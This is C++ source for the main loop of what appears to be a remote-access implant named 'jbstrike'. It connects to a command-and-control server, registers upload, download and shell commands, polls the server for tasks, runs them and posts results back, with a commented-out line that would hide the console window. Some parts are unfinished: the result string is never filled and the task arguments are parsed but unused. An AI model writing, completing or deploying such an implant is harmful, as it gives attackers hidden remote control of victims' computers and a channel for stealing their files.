// jbstrike_0.1a.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <Windows.h>
#include <WinHttp.h>

#include "Config.h"
#include "Agent.h"
#include "Command.h"

#pragma comment(lib, "winhttp.lib")

std::vector <std::string> split(std::string cmd, char delimiter = ' ');

int main()
{
	// Hide console window
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	Agent agent(C2_IP, C2_PORT);
	Command cmdHandler;


	cmdHandler.RegisterCommand(UPLOAD_CMD, std::bind(&Agent::upload, agent));
	cmdHandler.RegisterCommand(DOWNLOAD_CMD, std::bind(&Agent::download, agent));
	cmdHandler.RegisterCommand(SHELL_CMD, std::bind(&Agent::shell, agent));


	while (true) {
		std::string task = agent.Get(TASK_URI);

		if (task != "") {
			std::vector <std::string> Task = split(task);
			std::vector <std::string> args;
			args = std::vector<std::string>(Task.begin() + 1, Task.end());
			std::string Cmd = Task[0];

			std::cout << Cmd;

			if (cmdHandler.HasCommand(Cmd)) {
				std::string result;
				
				cmdHandler.ExecuteCommand(Cmd);

				agent.Post(RETURN_URI, result);
			}		
		}

		Sleep(SLEEP_TIME);
	}
}


std::vector <std::string> split(std::string cmd, char delimiter) {
	std::string line;
	std::vector <std::string> vec;
	std::stringstream ss(cmd);

	while (std::getline(ss, line, delimiter)) {
		vec.push_back(line);
	}
	return vec;
}